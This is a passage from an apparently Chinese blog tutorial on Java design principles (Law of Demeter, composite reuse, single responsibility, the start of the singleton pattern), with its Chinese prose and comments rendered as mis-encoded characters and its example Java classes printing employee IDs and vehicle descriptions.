class="hljs-keyword">void</span> <span class="hljs-title function_">printAllEmployee</span><span class="hljs-params">(CollegeManager sub)</span> &#123;<br>      <br>      <span class="hljs-comment">//åˆ†æé—®é¢˜</span><br>      <span class="hljs-comment">//1. è¿™é‡Œçš„ CollegeEmployee ä¸æ˜¯  SchoolManagerçš„ç›´æ¥æœ‹å‹</span><br>      <span class="hljs-comment">//2. CollegeEmployee æ˜¯ä»¥å±€éƒ¨å˜é‡æ–¹å¼å‡ºç°åœ¨ SchoolManager</span><br>      <span class="hljs-comment">//3. è¿åäº† è¿ªç±³ç‰¹æ³•åˆ™ </span><br>      <br>      <span class="hljs-comment">//è·å–åˆ°å­¦é™¢å‘˜å·¥</span><br>      List&lt;CollegeEmployee&gt; list1 = sub.getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------å­¦é™¢å‘˜å·¥------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (CollegeEmployee e : list1) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>      <span class="hljs-comment">//è·å–åˆ°å­¦æ ¡æ€»éƒ¨å‘˜å·¥</span><br>      List&lt;Employee&gt; list2 = <span class="hljs-built_in">this</span>.getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------å­¦æ ¡æ€»éƒ¨å‘˜å·¥------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (Employee e : list2) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åº”ç”¨å®ä¾‹æ”¹è¿›"><a class="markdownIt-Anchor" href="#åº”ç”¨å®ä¾‹æ”¹è¿›"></a> åº”ç”¨å®ä¾‹æ”¹è¿›</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204609508.png" alt="image-20230108204609508" /></p><ol><li><p>å‰é¢è®¾è®¡çš„é—®é¢˜åœ¨äº SchoolManager ä¸­ï¼Œ<strong>CollegeEmployee ç±»å¹¶ä¸æ˜¯ SchoolManager</strong> ç±»çš„ç›´æ¥æœ‹å‹ (åˆ†æ)</p></li><li><p>æŒ‰ç…§è¿ªç±³ç‰¹æ³•åˆ™ï¼Œåº”è¯¥é¿å…ç±»ä¸­å‡ºç°è¿™æ ·éç›´æ¥æœ‹å‹å…³ç³»çš„è€¦åˆ</p></li></ol><p><code>Demeter1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.demeter.improve;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">//å®¢æˆ·ç«¯</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demeter1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;~~~ä½¿ç”¨è¿ªç±³ç‰¹æ³•åˆ™çš„æ”¹è¿›~~~&quot;</span>);<br>      <span class="hljs-comment">//åˆ›å»ºäº†ä¸€ä¸ª SchoolManager å¯¹è±¡</span><br>      <span class="hljs-type">SchoolManager</span> <span class="hljs-variable">schoolManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolManager</span>();<br>      <span class="hljs-comment">//è¾“å‡ºå­¦é™¢çš„å‘˜å·¥id å’Œ  å­¦æ ¡æ€»éƒ¨çš„å‘˜å·¥ä¿¡æ¯</span><br>      schoolManager.printAllEmployee(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeManager</span>());<br><br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//å­¦æ ¡æ€»éƒ¨å‘˜å·¥ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//å­¦é™¢çš„å‘˜å·¥ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeEmployee</span> &#123;<br>   <span class="hljs-keyword">private</span> String id;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>      <span class="hljs-built_in">this</span>.id = id;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> id;<br>   &#125;<br>&#125;<br><br><br><span class="hljs-comment">//ç®¡ç†å­¦é™¢å‘˜å·¥çš„ç®¡ç†ç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeManager</span> &#123;<br>   <span class="hljs-comment">//è¿”å›å­¦é™¢çš„æ‰€æœ‰å‘˜å·¥</span><br>   <span class="hljs-keyword">public</span> List&lt;CollegeEmployee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;CollegeEmployee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;CollegeEmployee&gt;();<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬å¢åŠ äº†10ä¸ªå‘˜å·¥åˆ° list</span><br>         <span class="hljs-type">CollegeEmployee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeEmployee</span>();<br>         emp.setId(<span class="hljs-string">&quot;å­¦é™¢å‘˜å·¥id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br>   <br>   <span class="hljs-comment">//è¾“å‡ºå­¦é™¢å‘˜å·¥çš„ä¿¡æ¯</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printEmployee</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">//è·å–åˆ°å­¦é™¢å‘˜å·¥</span><br>      List&lt;CollegeEmployee&gt; list1 = getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------å­¦é™¢å‘˜å·¥------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (CollegeEmployee e : list1) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//å­¦æ ¡ç®¡ç†ç±»</span><br><br><span class="hljs-comment">//åˆ†æ SchoolManager ç±»çš„ç›´æ¥æœ‹å‹ç±»æœ‰å“ªäº› Employeeã€CollegeManager</span><br><span class="hljs-comment">//CollegeEmployee ä¸æ˜¯ ç›´æ¥æœ‹å‹ è€Œæ˜¯ä¸€ä¸ªé™Œç”Ÿç±»ï¼Œè¿™æ ·è¿èƒŒäº† è¿ªç±³ç‰¹æ³•åˆ™ </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolManager</span> &#123;<br>   <span class="hljs-comment">//è¿”å›å­¦æ ¡æ€»éƒ¨çš„å‘˜å·¥</span><br>   <span class="hljs-keyword">public</span> List&lt;Employee&gt; <span class="hljs-title function_">getAllEmployee</span><span class="hljs-params">()</span> &#123;<br>      List&lt;Employee&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Employee&gt;();<br>      <br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123; <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬å¢åŠ äº†5ä¸ªå‘˜å·¥åˆ° list</span><br>         <span class="hljs-type">Employee</span> <span class="hljs-variable">emp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>();<br>         emp.setId(<span class="hljs-string">&quot;å­¦æ ¡æ€»éƒ¨å‘˜å·¥id= &quot;</span> + i);<br>         list.add(emp);<br>      &#125;<br>      <span class="hljs-keyword">return</span> list;<br>   &#125;<br><br>   <span class="hljs-comment">//è¯¥æ–¹æ³•å®Œæˆè¾“å‡ºå­¦æ ¡æ€»éƒ¨å’Œå­¦é™¢å‘˜å·¥ä¿¡æ¯(id)</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">printAllEmployee</span><span class="hljs-params">(CollegeManager sub)</span> &#123;<br>      <br>      <span class="hljs-comment">//åˆ†æé—®é¢˜</span><br>      <span class="hljs-comment">//1. å°†è¾“å‡ºå­¦é™¢çš„å‘˜å·¥æ–¹æ³•ï¼Œå°è£…åˆ°CollegeManager</span><br>      sub.printEmployee();<br>   <br>      <span class="hljs-comment">//è·å–åˆ°å­¦æ ¡æ€»éƒ¨å‘˜å·¥</span><br>      List&lt;Employee&gt; list2 = <span class="hljs-built_in">this</span>.getAllEmployee();<br>      System.out.println(<span class="hljs-string">&quot;------------å­¦æ ¡æ€»éƒ¨å‘˜å·¥------------&quot;</span>);<br>      <span class="hljs-keyword">for</span> (Employee e : list2) &#123;<br>         System.out.println(e.getId());<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¿ªç±³ç‰¹æ³•åˆ™æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#è¿ªç±³ç‰¹æ³•åˆ™æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> è¿ªç±³ç‰¹æ³•åˆ™æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h3><ol><li><p>è¿ªç±³ç‰¹æ³•åˆ™çš„æ ¸å¿ƒæ˜¯é™ä½ç±»ä¹‹é—´çš„è€¦åˆ</p></li><li><p>ä½†æ˜¯æ³¨æ„ï¼šç”±äºæ¯ä¸ªç±»éƒ½å‡å°‘äº†ä¸å¿…è¦çš„ä¾èµ–ï¼Œå› æ­¤è¿ªç±³ç‰¹æ³•åˆ™åªæ˜¯è¦æ±‚é™ä½ç±»é—´(å¯¹è±¡é—´)è€¦åˆå…³ç³»ï¼Œ å¹¶ä¸æ˜¯è¦æ±‚å®Œå…¨æ²¡æœ‰ä¾èµ–å…³ç³»</p></li></ol><h2 id="6-åˆæˆå¤ç”¨åŸåˆ™composite-reuse-principle"><a class="markdownIt-Anchor" href="#6-åˆæˆå¤ç”¨åŸåˆ™composite-reuse-principle"></a> <strong>6ã€åˆæˆå¤ç”¨åŸåˆ™ï¼ˆComposite Reuse Principleï¼‰</strong></h2><p>åˆæˆå¤ç”¨åŸåˆ™æ˜¯æŒ‡ï¼šå°½é‡ä½¿ç”¨åˆæˆ/èšåˆçš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç»§æ‰¿ã€‚</p><ol><li><p>æ‰¾å‡ºåº”ç”¨ä¸­å¯èƒ½éœ€è¦å˜åŒ–ä¹‹å¤„ï¼ŒæŠŠå®ƒä»¬ç‹¬ç«‹å‡ºæ¥ï¼Œä¸è¦å’Œé‚£äº›ä¸éœ€è¦å˜åŒ–çš„ä»£ç æ··åœ¨ä¸€èµ·ã€‚</p></li><li><p>é’ˆå¯¹æ¥å£ç¼–ç¨‹ï¼Œè€Œä¸æ˜¯é’ˆå¯¹å®ç°ç¼–ç¨‹ã€‚</p></li><li><p>ä¸ºäº†äº¤äº’å¯¹è±¡ä¹‹é—´çš„<strong>æ¾è€¦åˆè®¾è®¡è€ŒåŠª</strong>åŠ›</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108204802649.png" alt="image-20230108204802649" /></p><h2 id="7-å•ä¸€èŒè´£åŸåˆ™single-principle"><a class="markdownIt-Anchor" href="#7-å•ä¸€èŒè´£åŸåˆ™single-principle"></a> <strong>7ã€å•ä¸€èŒè´£åŸåˆ™ï¼ˆSingle Principleï¼‰</strong></h2><p>å¯¹ç±»æ¥è¯´çš„ï¼Œ<strong>å³ä¸€ä¸ªç±»åº”è¯¥åªè´Ÿè´£ä¸€é¡¹èŒè´£</strong>ã€‚å¦‚ç±» A è´Ÿè´£ä¸¤ä¸ªä¸åŒèŒè´£ï¼šèŒè´£ 1ï¼ŒèŒè´£ 2ã€‚å½“èŒè´£ 1 éœ€æ±‚å˜æ›´è€Œæ”¹å˜ A æ—¶ï¼Œå¯èƒ½é€ æˆèŒè´£ 2 æ‰§è¡Œé”™è¯¯ï¼Œæ‰€ä»¥éœ€è¦å°†ç±» A çš„ç²’åº¦åˆ†è§£ä¸º A1ï¼ŒA2</p><p><code>SingleResponsibility1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.singleresponsibility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleResponsibility1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Vehicle</span> <span class="hljs-variable">vehicle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vehicle</span>();<br>      vehicle.run(<span class="hljs-string">&quot;æ‘©æ‰˜è½¦&quot;</span>);<br>      vehicle.run(<span class="hljs-string">&quot;æ±½è½¦&quot;</span>);<br>      vehicle.run(<span class="hljs-string">&quot;é£æœº&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// äº¤é€šå·¥å…·ç±»</span><br><span class="hljs-comment">// æ–¹å¼1</span><br><span class="hljs-comment">// 1. åœ¨æ–¹å¼1 çš„runæ–¹æ³•ä¸­ï¼Œè¿åäº†å•ä¸€èŒè´£åŸåˆ™</span><br><span class="hljs-comment">// 2. è§£å†³çš„æ–¹æ¡ˆéå¸¸çš„ç®€å•ï¼Œæ ¹æ®äº¤é€šå·¥å…·è¿è¡Œæ–¹æ³•ä¸åŒï¼Œåˆ†è§£æˆä¸åŒç±»å³å¯</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot; åœ¨å…¬è·¯ä¸Šè¿è¡Œ....&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SingleResponsibility2.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.singleresponsibility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleResponsibility2</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">RoadVehicle</span> <span class="hljs-variable">roadVehicle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RoadVehicle</span>();<br>      roadVehicle.run(<span class="hljs-string">&quot;æ‘©æ‰˜è½¦&quot;</span>);<br>      roadVehicle.run(<span class="hljs-string">&quot;æ±½è½¦&quot;</span>);<br>      <br>      <span class="hljs-type">AirVehicle</span> <span class="hljs-variable">airVehicle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AirVehicle</span>();<br>      <br>      airVehicle.run(<span class="hljs-string">&quot;é£æœº&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//æ–¹æ¡ˆ2çš„åˆ†æ</span><br><span class="hljs-comment">//1. éµå®ˆå•ä¸€èŒè´£åŸåˆ™</span><br><span class="hljs-comment">//2. ä½†æ˜¯è¿™æ ·åšçš„æ”¹åŠ¨å¾ˆå¤§ï¼Œå³å°†ç±»åˆ†è§£ï¼ŒåŒæ—¶ä¿®æ”¹å®¢æˆ·ç«¯</span><br><span class="hljs-comment">//3. æ”¹è¿›ï¼šç›´æ¥ä¿®æ”¹Vehicle ç±»ï¼Œæ”¹åŠ¨çš„ä»£ç ä¼šæ¯”è¾ƒå°‘=&gt;æ–¹æ¡ˆ3</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RoadVehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot;å…¬è·¯è¿è¡Œ&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AirVehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot;å¤©ç©ºè¿è¡Œ&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WaterVehicle</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot;æ°´ä¸­è¿è¡Œ&quot;</span>);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SingleResponsibility3.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.singleresponsibility;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleResponsibility3</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">Vehicle2</span> <span class="hljs-variable">vehicle2</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vehicle2</span>();<br>      vehicle2.run(<span class="hljs-string">&quot;æ±½è½¦&quot;</span>);<br>      vehicle2.runWater(<span class="hljs-string">&quot;è½®èˆ¹&quot;</span>);<br>      vehicle2.runAir(<span class="hljs-string">&quot;é£æœº&quot;</span>);<br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-comment">//æ–¹å¼3çš„åˆ†æ</span><br><span class="hljs-comment">//1. è¿™ç§ä¿®æ”¹æ–¹æ³•æ²¡æœ‰å¯¹åŸæ¥çš„ç±»åšå¤§çš„ä¿®æ”¹ï¼Œåªæ˜¯å¢åŠ æ–¹æ³•</span><br><span class="hljs-comment">//2. è¿™é‡Œè™½ç„¶æ²¡æœ‰åœ¨ç±»è¿™ä¸ªçº§åˆ«ä¸Šéµå®ˆå•ä¸€èŒè´£åŸåˆ™ï¼Œä½†æ˜¯åœ¨æ–¹æ³•çº§åˆ«ä¸Šï¼Œä»ç„¶æ˜¯éµå®ˆå•ä¸€èŒè´£</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vehicle2</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      <span class="hljs-comment">//å¤„ç†</span><br>      <br>      System.out.println(vehicle + <span class="hljs-string">&quot; åœ¨å…¬è·¯ä¸Šè¿è¡Œ....&quot;</span>);<br>      <br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runAir</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot; åœ¨å¤©ç©ºä¸Šè¿è¡Œ....&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runWater</span><span class="hljs-params">(String vehicle)</span> &#123;<br>      System.out.println(vehicle + <span class="hljs-string">&quot; åœ¨æ°´ä¸­è¡Œ....&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-comment">//æ–¹æ³•2.</span><br>   <span class="hljs-comment">//..</span><br>   <span class="hljs-comment">//..</span><br>   <br>   <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å•ä¸€èŒè´£åŸåˆ™æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#å•ä¸€èŒè´£åŸåˆ™æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> å•ä¸€èŒè´£åŸåˆ™æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h3><ol><li><p>é™ä½ç±»çš„å¤æ‚åº¦ï¼Œä¸€ä¸ªç±»åªè´Ÿè´£ä¸€é¡¹èŒè´£ã€‚</p></li><li><p>é«˜ç±»çš„å¯è¯»æ€§ï¼Œå¯ç»´æŠ¤æ€§</p></li><li><p>é™ä½å˜æ›´å¼•èµ·çš„é£é™©</p></li><li><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”å½“éµå®ˆå•ä¸€èŒè´£åŸåˆ™ï¼Œåªæœ‰é€»è¾‘è¶³å¤Ÿç®€å•ï¼Œæ‰å¯ä»¥åœ¨ä»£ç çº§è¿åå•ä¸€èŒè´£åŸåˆ™ï¼›åªæœ‰ç±»ä¸­æ–¹æ³•æ•°é‡è¶³å¤Ÿå°‘ï¼Œå¯ä»¥åœ¨æ–¹æ³•çº§åˆ«ä¿æŒå•ä¸€èŒè´£åŸåˆ™</p></li></ol><h1 id="å•ä¾‹æ¨¡å¼"><a class="markdownIt-Anchor" href="#å•ä¾‹æ¨¡å¼"></a> <mark>å•ä¾‹æ¨¡å¼</mark></h1><p>æœ€ä¸ºé‡è¦</p><p>å•ä¾‹æ¨¡å¼ï¼ˆSingleton Patternï¼‰æ˜¯ Java ä¸­æœ€ç®€å•çš„è®¾è®¡æ¨¡å¼ä¹‹ä¸€ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚</p><p>è¿™ç§æ¨¡å¼æ¶‰åŠåˆ°ä¸€ä¸ªå•ä¸€çš„ç±»ï¼Œè¯¥ç±»è´Ÿè´£åˆ›å»ºè‡ªå·±çš„å¯¹è±¡ï¼ŒåŒæ—¶ç¡®ä¿åªæœ‰å•ä¸ªå¯¹è±¡è¢«åˆ›å»ºã€‚è¿™ä¸ªç±»æä¾›äº†ä¸€ç§è®¿é—®å…¶å”¯ä¸€çš„å¯¹è±¡çš„æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥è®¿é—®ï¼Œä¸éœ€è¦å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>1ã€å•ä¾‹ç±»åªèƒ½æœ‰ä¸€ä¸ªå®ä¾‹ã€‚</li><li>2ã€å•ä¾‹ç±»å¿…é¡»è‡ªå·±åˆ›å»ºè‡ªå·±çš„å”¯ä¸€å®ä¾‹ã€‚</li><li>3ã€å•ä¾‹ç±»å¿…é¡»ç»™æ‰€æœ‰å…¶ä»–å¯¹è±¡æä¾›è¿™ä¸€å®ä¾‹ã€‚</li></ul><h2 id="ä»‹ç»"><a class="markdownIt-Anchor" href="#ä»‹ç»"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> ä¿è¯ä¸€ä¸ªç±»ä»…æœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå¹¶æä¾›ä¸€ä¸ªè®¿é—®å®ƒçš„å…¨å±€è®¿é—®ç‚¹ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> ä¸€ä¸ªå…¨å±€ä½¿ç”¨çš„ç±»é¢‘ç¹åœ°åˆ›å»ºä¸é”€æ¯ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> 